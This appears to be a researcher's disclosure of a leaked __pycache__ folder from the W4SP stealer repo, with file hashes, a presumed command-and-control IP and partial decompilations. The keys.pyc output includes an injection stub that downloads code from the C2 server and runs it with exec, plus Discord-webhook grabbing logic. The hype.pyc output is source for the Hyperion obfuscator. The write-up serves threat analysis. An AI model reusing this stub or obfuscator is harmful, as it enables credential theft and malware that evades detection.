### Command&Control IP?

Recently, the [w4sp-stealer-sourcecode](https://github.com/im4wasp/w4sp-stealer-sourcecode) repo posted a commit that included a  \_\_pycache\_\_  folder. It has since been removed, but I was able to snag it before removal. 

The pycache folder contained two files: **hype.pyc**  (hyperion obfuscator) and **keys.pyc** (part of the W4SP-API). 

```
File: keys.cpython-310.pyc (Python 3.10)
SHA256: adfb0198be893c0d0e5f9f1d6bbfd8cf3df13710d78d231bb5beb7dd4e45aab1

File: hype.cpython-310.pyc (Python 3.10)
SHA256: 6493a2aa314d0102c5345cc8c1c6883d34f4385d22731e514027bed53eaf5ec8
```

Using [pycdc](https://github.com/zrax/pycdc) **(Decompyle++)**, I was able to obtain a partial decompilation of both of the files and uncovered something interesting. 

Notice the value of the **api** variable, ```api = 'http://4.228.83.86'``` an IP address which (presumably) is under the control of the owners of the w4sp-stealer-sourcecode repo (who claim to be the creators of w4sp stealer, billythegoat356 and BlueRed). 

I ran some OSINT scans on the IP, results can be found here:

for humans: 
- [pdf](w4sp-found-ip.cleaned.pdf)
- [html](w4sp-found-ip.html)

for robots:
- [gexf](w4sp-found-ip.gexf)
- [json](w4sp-found-ip.json)
- [csv](w4sp-found-ip.csv)

I'm including below the results of decompilation for both files:
```
# Source Generated with Decompyle++
# File: keys.cpython-310.pyc (Python 3.10)

from random import choice
from json import load, dump, loads, dumps
from etc.hype import Obfuscate
import base64
from datetime import datetime
from requests import post
Response = '\nFelpes#1234\n<br><br>\no.o\n<br><br>\n...\n<br><br>\n...\n'.strip()
api = 'http://4.228.83.86'

class Keys:
    
    def _rand_key():
Unsupported opcode: GEN_START
        return ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(16)))

    
    def _gen_key():
Unsupported opcode: GEN_START
        return ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(16)))

    
    def _get():
Unsupported opcode: WITH_EXCEPT_START
        pass
    # WARNING: Decompyle incomplete

    
    def _update(dict):
Unsupported opcode: WITH_EXCEPT_START
        pass
    # WARNING: Decompyle incomplete

    
    def _webhook(webhook):
Warning: Stack history is not empty!
Warning: block stack is not empty!
        
        try:
            webhook = webhook.strip('/').split('/')
            if len(webhook) != 7:
                pass
        finally:
            return False
            webhook = f'''https://discord.com/api/webhooks/{webhook[5]}/{webhook[6]}'''
            return webhook
            return False


    
    def _get_webhook_by_pkey(pkey, ptoken = ('',)):
        keys = Keys._get()
Unsupported opcode: MAP_ADD
        pkeys = (lambda .0: pass# WARNING: Decompyle incomplete
)(keys.values())
Unsupported opcode: SET_ADD
        psecu = (lambda .0 = None: pass# WARNING: Decompyle incomplete
)(api)
        if not pkey not in pkeys and psecu == {
            None}:
            return None
        if None == {
            None}:
            return psecu
        return None[pkey]



def date():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')


def Gen(id, username, payment):
    key = Keys._gen_key()
    public_key = Keys._rand_key()
    keys = Keys._get()
    if id in str(keys):
        return 203
    keys[key] = (None, 'none', date(), username, id, payment)
    print(public_key)
    Keys._update(keys)
    return 200


def Remove(user_key):
    keys = Keys._get()
    if user_key not in keys:
        return 203
    None.pop(user_key)
    Keys._update(keys)
    return 200


def Edit(key, webhook):
    keys = Keys._get()
    if key not in keys:
        return (Response, 401)
    public_key = None[key][0]
    date = keys[key][2]
    username = keys[key][3]
    id = keys[key][4]
    payment = keys[key][5]
    webhook = Keys._webhook(webhook, **('webhook',))
    if not webhook:
        return (Response, 401)
    keys[key] = (None, webhook, date, username, id, payment)
    Keys._update(keys)
    return (webhook, 200)


def Script(public_key, webhookID):
    webhook = Keys._get_webhook_by_pkey(public_key, webhookID)
    if webhook is None:
        return (Response, 401)
    payload = None
    inj = 'from tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen(\'%API%/inject/%PUBKEY%\').read())""")\n_ttmp.close()\ntry: _ssystem(f"start {_eexecutable.replace(\'.exe\', \'w.exe\')} {_ttmp.name}")\nexcept: pass'
    injtocode = inj.replace('%API%', api).replace('%PUBKEY%', public_key)
    sample_string_bytes = injtocode.encode('ascii')
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode('ascii')
    script = payload.replace('%PAYLOAD%', base64_string)
    return script


def Inject(public_key, headers):
Unsupported opcode: WITH_EXCEPT_START
    webhook = Keys._get_webhook_by_pkey(public_key)
    if webhook is None:
        return (Response, 401)
# WARNING: Decompyle incomplete


def Grab(public_key, headers):
Unsupported opcode: WITH_EXCEPT_START
    webhook = Keys._get_webhook_by_pkey(public_key)
    if webhook is None:
        return (Response, 401)
    with None('scripts/grab.py', 'r', 'utf8', **('mode', 'encoding')) as f:
        script = f.read().replace('W4SPHOOK', webhook)
        None(None, None, None)
# WARNING: Decompyle incomplete


def Webhook(public_key):
    public_keys = Keys._get().values()
Unsupported opcode: GEN_START
    return None((lambda .0 = None: pass# WARNING: Decompyle incomplete
)(public_keys), (Response, 401))

```

```
# Source Generated with Decompyle++
# File: hype.cpython-310.pyc (Python 3.10)

from builtins import *
builtglob = list(globals().keys())
from binascii import hexlify
from tokenize import tokenize, untokenize, TokenInfo
from io import BytesIO
from re import findall
from random import choice, shuffle, randint
from zlib import compress

class Hyperion:
    
    def __init__(self, content, clean, obfcontent, renlibs, renvars, addbuiltins, randlines = None, shell = None, camouflate = None, safemode = (True, True, True, True, True, True, True, True, True, False), ultrasafemode = ('content', str, 'return', None)):
        """
        Use Safe Modes only if you have errors with your obfuscated script [!!!]
        ## Settings

        clean: Use this if you want to clean the code (compress intendations, remove comments...)
        >>> # [!!!] Be aware that this can cause some bugs [!!!]

        obfcontent: Use this if you want to obfuscate the content of the variables
        >>> # [!!!] Be aware that this can cause some bugs on very complex scripts, but generally it should work [!!!]

        renlibs: Use this if you want to obfuscate the content of the variables
        >>> # [!!!] Be aware that this can cause some bugs on very complex scripts, but generally it should work [!!!]

        renvars: Use this if you want to obfuscate the content of the variables
        >>> # [!!!] Be aware that this can cause some bugs on very complex scripts, but generally it should work [!!!]

        addbuiltins: Use this to also rename the builtins only if you haven't used the same vars
        >>> # [!!!] Be aware that this can cause some bugs [!!!]

        randlines: Use this only if you haven't variable defined on multiple lines!
        >>> # [!!!] Be aware that this can cause some bugs [!!!]

        shell: Use this to add a shell to each chunk in your code
        >>> # [!!!] Be aware that this can cause some bugs [!!!]

        camouflate: Use this to camouflate the final code
        >>> # [!!!] No bugs [!!!]


        safemode: Use this if you used positional arguments / predefined arguments in your functions
        >>> # [!!!] No bugs [!!!]

        ultrasafemode: Use this to skip the layers most likely to cause errors
        >>> # [!!!] No bugs [!!!]
        """
        if ultrasafemode == True:
            (randlines, shell, renlibs, renvars) = (False, False, False, False)
        self.content = "exec('')\n\n" + content
        self.camouflate = camouflate
        self.add_imports = []
        self.impcontent2 = []
        self.safemode = safemode
        if addbuiltins:
            self.AddBuiltins()
        self.CreateVars()
        if renlibs:
            valid = self.RenameImports()
        if renvars and valid:
            self.RenameVars()
        self.strings = { }
        if obfcontent:
            self.ObfContent()
        if clean:
            self.CleanCode()
        if not self._verify_lin(content):
            (randlines, shell) = (False, False)
        if randlines:
            self.RandLines()
        if shell:
            self.Shell()
        self.Organise()
        if clean:
            self.CleanCode()
        self.Compress()
        if camouflate:
            self.Camouflate()
            return None
        self.content = None.join(self.content)

    
    def AntiSkid(self):
        if self.camouflate:
            self.content = f'''\n# GG! You just deobfuscated a file obfuscated with Hyperion\n\n# Congratulations!\n\n# https://github.com/billythegoat356/Hyperion\n\n# by billythegoat356 and BlueRed\n\n\ntry:\n    if (\n        __obfuscator__ != "Hyperion" or\n        __authors__ != ("billythegoat356", "BlueRed") or\n        __github__ != "https://github.com/billythegoat356/Hyperion" or\n        __discord__ != "https://discord.gg/plague" or\n        __license__ != "EPL-2.0" or\n        __code__ != \'print("Hello world!")\'\n    ):\n        int(\'skid\')\nexcept:\n    input("Roses are red\\nViolets are blue\\nYou are a skid\\nNobody likes you")\n    __import__(\'sys\').exit()\n\n\n{self.content}'''.strip()
            return None

    
    def AddBuiltins(self):
        imp = None + None((lambda .0 = None: pass# WARNING: Decompyle incomplete
)(builtglob)) + '\n'
        if imp == 'from builtins import \n':
            imp = ''
        self.content = imp + self.content

    
    def CreateVars(self):
        self.globals = self._randvar()
        self.locals = self._randvar()
        self.vars = self._randvar()
        self.__import__ = self._randvar()
        imports = self._to_import
        impcontent = "\n{0}()['{1}']=locals\n{1}()['{2}']=__import__\n{0}()['{3}']={2}('builtins').vars"[1:].format(self.globals, self.locals, self.__import__, self.vars, self.unhexlify).splitlines()
        nimpcontent = (lambda .0 = None: [ f'''{self._randglob()}()[\'{imports[imp]}\']={imp}''' for imp in .0 ])(imports)
        shuffle(nimpcontent)
        impcontent.extend(iter(nimpcontent))
        self.local_import = f'''locals()[\'{self.globals}\']=globals'''
        self.impcontent = impcontent

    
    def RenameImports(self):
        _imports = self._gather_imports()
        if _imports == False:
            return False
        imports = None
        for imp in _imports:
            imports.extend(iter(imp))
        self.imports = { }
        for imp in imports:
            self.imports[imp] = self._randvar()
        impcontent = (lambda .0 = None: [ f'''{self._randglob()}()[\'{self.imports[imp]}\']={self._randglob()}()[{self._protect(imp)}]''' for imp in .0 ])(self.imports)
        shuffle(impcontent)
        self.add_imports = (lambda .0 = None: [ lin for lin in .0 if self._is_valid(lin) ])(self.content.splitlines())
        self.content = None((lambda .0 = None: pass# WARNING: Decompyle incomplete
)(self.content.splitlines()))
        self.impcontent2 = iter(impcontent)
        return True

    
    def RenameVars(self):
        f = BytesIO(self.content.encode('utf-8'))
        self.tokens = list(tokenize(f.readline))
        strings = { }
        ntokens = []
        passed = []
        for token in self.tokens:
            string = token.string
            type = token.type
            if type == 1:
                if not (self.tokens[self.tokens.index(token) + 1].string == '=' or self._is_not_arg(string) or self.tokens[self.tokens.index(token) - 1].string in ('def', 'class')) and self._check_fstring(string) and self._is_not_library(token, **('token',)) and string not in passed and string not in self.imports and string.startswith('__') and string.endswith('__'):
                    string = self._randvar()
                    strings[token.string] = string
                elif string in strings and self._is_not_library(token, **('token',)) and self.tokens[self.tokens.index(token) + 1].string != '=':
                    string = strings[string]
                elif string in self.imports and self._is_exact_library(token, **('token',)):
                    if self.tokens[self.tokens.index(token) + 1].string != '=' and self.tokens[self.tokens.index(token) - 1].string not in ('def', 'class'):
                        string = self.imports[string]
                    else:
                        passed.append(string)
            ntokens.append(TokenInfo(type, string, token.start, token.end, token.line))
        self.content = untokenize(ntokens).decode('utf-8')

    
    def ObfContent(self):
        f = BytesIO(self.content.encode('utf-8'))
        self.tokens = list(tokenize(f.readline))
        ntokens = []
        for token in self.tokens:
            string = token.string
            type = token.type
            if type == 1:
                if string in ('True', 'False'):
                    string = self._obf_bool(string)
                elif type == 2:
                    string = self._obf_int(string)
                elif type == 3:
                    string = self._obf_str(string)
            ntokens.append(TokenInfo(type, string, token.start, token.end, token.line))
        self.ostrings = self.strings
        self.lambdas = []
        self._add_lambdas()
        strings = (lambda .0 = None: [ f'''{self.vars}()[{self._protect(var)}]={value}''' for var, value in .0 ])(self.strings.items())
        shuffle(strings)
        self.strings = strings
        self.content = untokenize(ntokens).decode('utf-8')

    
    def CleanCode(self):
        self.RemoveComments()
        self.CompressCode()

    
    def RandLines(self):
        content = []
        lines = self.content.splitlines()
        for lin, nextlin in zip(lines, range(len(lines))):
            content.append(lin)
            if nextlin == len(lines) - 1 and self._get_first_statement(lines[nextlin + 1]) in ('elif', 'else', 'except', 'finally') or lin.strip()[-1] == ',':
                continue
            fakelin = self._fake_lin(self._get_indentations(lines[nextlin + 1]))
            content.append(fakelin)
        self.content = '\n'.join(content)

    
    def Shell(self):
        chunks = self._get_chunks()
        chunks = (lambda .0 = None: [ f'''{self._protect_var(self.exec)}({self._protect(chunk, 1, **('r',))})''' for chunk in .0 ])(chunks)
        chunks = (lambda .0 = None: [ f'''{self._protect_var(self.eval)}({self._protect_var(self.compile)}({self._protect(chunk, 2, **('char',))},filename={self._protect(self._randvar())},mode={self._protect('eval')}))''' for chunk in .0 ])(chunks)
        self.content = '\n'.join(chunks)

    
    def Organise(self):
        gd_vars = [
            f'''{self.globals}()[{self._protect(self.getattr, True, **('basic',))}]=getattr''',
            f'''{self.globals}()[{self._protect(self.dir, True, **('basic',))}]=dir''']
        shuffle(gd_vars)
        exec_var = f'''{self.globals}()[{self._protect(self.exec)}]={self._protect_built('exec')}'''
        add_imports = (lambda .0 = None: [ f'''{self.globals}()[{self._protect(self.exec)}]({self._protect(imp.strip())})''' for imp in .0 ])(self.add_imports)
        self.content = self.local_import + '\n' + '\n'.join(gd_vars) + '\n' + '\n'.join(self.impcontent) + '\n' + exec_var + '\n' + '\n'.join(add_imports) + '\n' + '\n'.join(self.impcontent2) + '\n' + '\n'.join(self.strings) + '\n' + self.content

    
    def Compress(self):
        eval_var = f'''globals()[\'{self._hex('eval')}\']'''
        str_var = f'''globals()[\'{self._hex('str')}\']'''
        compile_var = f'''globals()[\'{self._hex('compile')}\']'''
        arg1 = self._randvar()
        arg2 = self._randvar()
        lambda1 = f'''(lambda {arg1}:{eval_var}({compile_var}({str_var}("{self._hex(eval_var)}({arg1})"),filename=\'{self._hex(self._randvar())}\',mode=\'{self._hex('eval')}\')))'''
        lambda2 = f'''(lambda {arg1}:{arg1}(__import__(\'{self._hex('zlib')}\')))'''
        lambda3 = f'''(lambda {arg1}:{arg1}[\'{self._hex('decompress')}\'])'''
        lambdas = [
            lambda1,
            lambda2,
            lambda3]
        lambda4 = f'''(lambda {arg2},{arg1}:{arg2}({arg1}))'''
        lambda5 = f'''(lambda:{lambda1}(\'{self._hex("__import__('builtins').exec")}\'))'''
        lambdas2 = [
            lambda4,
            lambda5]
        shuffle(lambdas)
        shuffle(lambdas2)
        keys = (lambda .0 = None: pass# WARNING: Decompyle incomplete
)(lambdas)
        keys2 = (lambda .0 = None: pass# WARNING: Decompyle incomplete
)(lambdas2)
        compressed = self._compress(self.content)
        if self.camouflate:
            self.compressed = compressed
            compressed = 'RANDOMVARS'
        decompress = f'''{keys[lambda3]}({keys[lambda2]}({keys[lambda1]}(\'{self._hex('vars')}\')))'''
        exec_content = f'''{keys2[lambda5]}()({keys2[lambda4]}({decompress},{compressed}))'''
        all_keys = keys
        all_keys.update(keys2)
        self.content = [
            'from builtins import *',
            ','.join(all_keys.values()) + '=' + ','.join(all_keys.keys()),
            exec_content]

    
    def Camouflate(self):
        self.gen = gen = []
        content = self.content
        for _ in range(24):
            self._gen_var()
        compressed = self._split_content(self.compressed, 2500, **('n',))
        bvars = (lambda .0 = None: pass# WARNING: Decompyle incomplete
)(compressed)
        vars = (lambda .0 = None: [ f'''{self._rand_pass()}{'                                                                                                                                                                                                                                                          '};{gen[0]}.{gen[19]}({gen[21]}=\'{a}\',{gen[22]}={b})''' for a, b in .0 ])(bvars.items())
        vars = '\n\n'.join((lambda .0: pass# WARNING: Decompyle incomplete
)(vars))
        randomvars = None((lambda .0 = None: pass# WARNING: Decompyle incomplete
)(bvars))
        self.content = []['\n'][f'''{content[0]}''']['\nfrom math import prod as '][f'''{gen[5]}''']['\n\n\n__obfuscator__ = \'Hyperion\'\n__authors__ = (\'billythegoat356\', \'BlueRed\')\n__github__ = \'https://github.com/billythegoat356/Hyperion\'\n__discord__ = \'https://discord.gg/plague\'\n__license__ = \'EPL-2.0\'\n\n__code__ = \'print("Hello world!")\'\n\n\n'][f'''{gen[11]}'''][', '][f'''{gen[12]}'''][', '][f'''{gen[13]}'''][', '][f'''{gen[14]}'''][', '][f'''{gen[15]}'''][', '][f'''{gen[17]}'''][' = exec, str, tuple, map, ord, globals\n\nclass '][f'''{gen[0]}'''][':\n    def __init__(self, '][f'''{gen[4]}''']['):\n        self.'][f'''{gen[3]}'''][' = '][f'''{gen[5]}''']['(('][f'''{gen[4]}'''][', '][f'''{self._rand_int()}''']['))\n        self.'][f'''{gen[1]}''']['('][f'''{gen[6]}''']['='][f'''{self._rand_int()}'''][')\n\n    def '][f'''{gen[1]}''']['(self, '][f'''{gen[6]}'''][' = '][f'''{self._rand_type()}''']['):\n        self.'][f'''{gen[3]}'''][' '][f'''{self._rand_op()}''']['= '][f'''{self._rand_int()}'''][' '][f'''{self._rand_op()}'''][' '][f'''{gen[6]}''']['\n\n    def '][f'''{gen[2]}''']['(self, '][f'''{gen[7]}'''][' = '][f'''{self._rand_int()}''']['):\n        '][f'''{gen[7]}'''][' '][f'''{self._rand_op()}''']['= '][f'''{self._rand_int()}'''][' '][f'''{self._rand_op()}'''][' '][f'''{self._rand_int()}''']['\n        self.'][f'''{gen[8]}'''][' != '][f'''{self._rand_type()}''']['\n\n    def '][f'''{gen[18]}''']['('][f'''{gen[20]}'''][' = '][f'''{self._rand_type()}''']['):\n        return '][f'''{gen[17]}''']['()['][f'''{gen[20]}'''][']\n\n    def '][f'''{gen[19]}''']['('][f'''{gen[21]}'''][' = '][f'''{self._rand_int()}'''][' '][f'''{self._rand_op()}'''][' '][f'''{self._rand_int()}'''][', '][f'''{gen[22]}'''][' = '][f'''{self._rand_type()}'''][', '][f'''{gen[23]}'''][' = '][f'''{gen[17]}''']['):\n        '][f'''{gen[23]}''']['()['][f'''{gen[21]}''']['] = '][f'''{gen[22]}''']['\n\n    def execute(code = str):\n        return '][f'''{gen[11]}''']['('][f'''{gen[12]}''']['('][f'''{gen[13]}''']['('][f'''{gen[14]}''']['('][f'''{gen[15]}'''][', code))))\n\n    @property\n    def '][f'''{gen[8]}''']['(self):\n        self.'][f'''{gen[9]}'''][" = '<__main__."][f'''{choice(gen)}'''][' object at 0x00000'][f'''{randint(1000, 9999)}''']['BE'][f'''{randint(10000, 99999)}'''][">'\n        return (self."][f'''{gen[9]}'''][', '][f'''{gen[0]}''']['.'][f'''{gen[8]}'''][")\n\nif __name__ == '__main__':\n    try:\n        "][f'''{gen[0]}''']['.execute(code = __code__)\n        '][f'''{gen[10]}'''][' = '][f'''{gen[0]}''']['('][f'''{gen[4]}'''][' = '][f'''{self._rand_int()}'''][' '][f'''{self._rand_op()}'''][' '][f'''{self._rand_int()}'''][')\n'][f'''{vars}''']['\n        '][f'''{self._rand_pass()}'''][f'''{'                                                                                                                                                                                                                                                          '}'''][';'][f'''{content[1]}''']['\n        '][f'''{self._rand_pass()}'''][f'''{'                                                                                                                                                                                                                                                          '}'''][';'][f'''{content[2].replace('RANDOMVARS', randomvars)}''']['\n    except Exception as '][f'''{gen[16]}'''][':\n        if '][f'''{self._rand_bool(False)}'''][':\n            '][f'''{gen[0]}''']['.execute(code = '][f'''{gen[12]}''']['('][f'''{gen[16]}''']['))\n        elif '][f'''{self._rand_bool(False)}'''][':\n            '][f'''{self._rand_pass(False, **('line',))}''']([]['\n'][f'''{content[0]}''']['\nfrom math import prod as '][f'''{gen[5]}''']['\n\n\n__obfuscator__ = \'Hyperion\'\n__authors__ = (\'billythegoat356\', \'BlueRed\')\n__github__ = \'https://github.com/billythegoat356/Hyperion\'\n__discord__ = \'https://discord.gg/plague\'\n__license__ = \'EPL-2.0\'\n\n__code__ = \'print("Hello world!")\'\n\n\n'][f'''{gen[11]}'''][', '][f'''{gen[12]}'''][', '][f'''{gen[13]}'''][', '][f'''{gen[14]}'''][', '][f'''{gen[15]}'''][', '][f'''{gen[17]}'''][' = exec, str, tuple, map, ord, globals\n\nclass '][f'''{gen[0]}'''][':\n    def __init__(self, '][f'''{gen[4]}''']['):\n        self.'][f'''{gen[3]}'''][' = '][f'''{gen[5]}''']['(('][f'''{gen[4]}'''][', '][f'''{self._rand_int()}''']['))\n        self.'][f'''{gen[1]}''']['('][f'''{gen[6]}''']['='][f'''{self._rand_int()}'''][')\n\n    def '][f'''{gen[1]}''']['(self, '][f'''{gen[6]}'''][' = '][f'''{self._rand_type()}''']['):\n        self.'][f'''{gen[3]}'''][' '][f'''{self._rand_op()}''']['= '][f'''{self._rand_int()}'''][' '][f'''{self._rand_op()}'''][' '][f'''{gen[6]}''']['\n\n    def '][f'''{gen[2]}''']['(self, '][f'''{gen[7]}'''][' = '][f'''{self._rand_int()}''']['):\n        '][f'''{gen[7]}'''][' '][f'''{self._rand_op()}''']['= '][f'''{self._rand_int()}'''][' '][f'''{self._rand_op()}'''][' '][f'''{self._rand_int()}''']['\n        self.'][f'''{gen[8]}'''][' != '][f'''{self._rand_type()}''']['\n\n    def '][f'''{gen[18]}''']['('][f'''{gen[20]}'''][' = '][f'''{self._rand_type()}''']['):\n        return '][f'''{gen[17]}''']['()['][f'''{gen[20]}'''][']\n\n    def '][f'''{gen[19]}''']['('][f'''{gen[21]}'''][' = '][f'''{self._rand_int()}'''][' '][f'''{self._rand_op()}'''][' '][f'''{self._rand_int()}'''][', '][f'''{gen[22]}'''][' = '][f'''{self._rand_type()}'''][', '][f'''{gen[23]}'''][' = '][f'''{gen[17]}''']['):\n        '][f'''{gen[23]}''']['()['][f'''{gen[21]}''']['] = '][f'''{gen[22]}''']['\n\n    def execute(code = str):\n        return '][f'''{gen[11]}''']['('][f'''{gen[12]}''']['('][f'''{gen[13]}''']['('][f'''{gen[14]}''']['('][f'''{gen[15]}'''][', code))))\n\n    @property\n    def '][f'''{gen[8]}''']['(self):\n        self.'][f'''{gen[9]}'''][" = '<__main__."][f'''{choice(gen)}'''][' object at 0x00000'][f'''{randint(1000, 9999)}''']['BE'][f'''{randint(10000, 99999)}'''][">'\n        return (self."][f'''{gen[9]}'''][', '][f'''{gen[0]}''']['.'][f'''{gen[8]}'''][")\n\nif __name__ == '__main__':\n    try:\n        "][f'''{gen[0]}''']['.execute(code = __code__)\n        '][f'''{gen[10]}'''][' = '][f'''{gen[0]}''']['('][f'''{gen[4]}'''][' = '][f'''{self._rand_int()}'''][' '][f'''{self._rand_op()}'''][' '][f'''{self._rand_int()}'''][')\n'][f'''{vars}''']['\n        '][f'''{self._rand_pass()}'''][f'''{'                                                                                                                                                                                                                                                          '}'''][';'][f'''{content[1]}''']['\n        '][f'''{self._rand_pass()}'''][f'''{'                                                                                                                                                                                                                                                          '}'''][';'][f'''{content[2].replace('RANDOMVARS', randomvars)}''']['\n    except Exception as '][f'''{gen[16]}'''][':\n        if '][f'''{self._rand_bool(False)}'''][':\n            '][f'''{gen[0]}''']['.execute(code = '][f'''{gen[12]}''']['('][f'''{gen[16]}''']['))\n        elif '][f'''{self._rand_bool(False)}'''][':\n            '][f'''{self._rand_pass(False, **('line',))}''']['\n']).strip()

    
    class StarImport(Exception):
        __qualname__ = 'Hyperion.StarImport'
        
        def __init__(self = None):
            super().__init__('Star Import is forbidden, please update your script')

        __classcell__ = None

    
    def _verify_lin(self, content):
        return all((lambda .0: pass# WARNING: Decompyle incomplete
)(content.splitlines()))

    
    def _hex(self, var):
        return ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(var))

    
    def _randvar(self):
        return choice((''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), 'O' + ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), 'S' + ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25)))), ''.join((lambda .0: pass# WARNING: Decompyle incomplete
)(range(randint(17, 25))))))

    
    def _randglob(self):
        return choice((self.globals, self.locals, self.vars))

    
    def _protect(self, var, basic, r, char = (False, 0, 1)):
        char = "'" if char == 1 else '"'
        if basic:
            return f'''{char}{''.join(reversed(var))}{char}[::+-+-(-(+1))]'''
        if None(var) == int:
            return self._adv_int(var)
        if None == 0:
            r = randint(1, 2)
        if r == 1:
            return f'''{self.unhexlify}({hexlify(var.encode('utf-8'))}).decode({self.utf8})'''
        return f'''{None}{''.join(reversed(var))}{char}[::+-+-(-(+{self._protect(1, basic, **('basic',))}))]'''

    
    def _protect_built(self, var, lib = ('builtins',)):
        protected = self._protect(lib, 2, True, **('r', 'basic'))
        return f'''{self.getattr}({self.__import__}({protected}),{self.dir}({self.__import__}({protected}))[{self.dir}({self.__import__}({protected})).index({self._protect(var, 2, True, **('r', 'basic'))})])'''

    
    def _to_import(self):
        self.dir = self._randvar()
        self.getattr = self._randvar()
        self.exec = self._randvar()
        self.eval = self._randvar()
        self.compile = self._randvar()
        self.join = self._randvar()
        self.true = self._randvar()
        self.false = self._randvar()
        self.bool = self._randvar()
        self.str = self._randvar()
        self.float = self._randvar()
        self.unhexlify = self._randvar()
        imports = {
            self._protect_built('unhexlify', 'binascii', **('lib',)): self.unhexlify,
            self._protect_built('float'): self.float,
            self._protect_built('str'): self.str,
            self._protect_built('bool'): self.bool,
            self._protect_built('False'): self.false,
            self._protect_built('True'): self.true,
            "''.join": self.join,
            self._protect_built('compile'): self.compile,
            self._protect_built('eval'): self.eval }
        return imports

    _to_import = property(_to_import)
    
    def utf8(self):
        return self._protect('utf8', True, 2, **('basic', 'r'))

    utf8 = property(utf8)
    
    def _gather_imports(self):
        imports = (lambda .0 = None: [ lin for lin in .0 if self._is_valid(lin) ])(self.content.splitlines())
        for imp in imports:
            if '*' in imp:
                return False
            return (lambda .0: for imp in .0:
passcontinueimp.replace('import ', ',').replace('from ', '').replace(' ', '').split(',')[1:][imp.replace('import ', '').replace(' ', '').split(',')])(imports)

    
    def _is_valid(self = None, lin = None):
        if 'import' in lin and '"' not in lin and "'" not in lin and ';' not in lin and '.' not in lin:
            pass
        return '#' not in lin

    
    def _is_not_arg(self, string):
        if not self.safemode:
            return True
        funcs = None._gather_funcs
        fo
```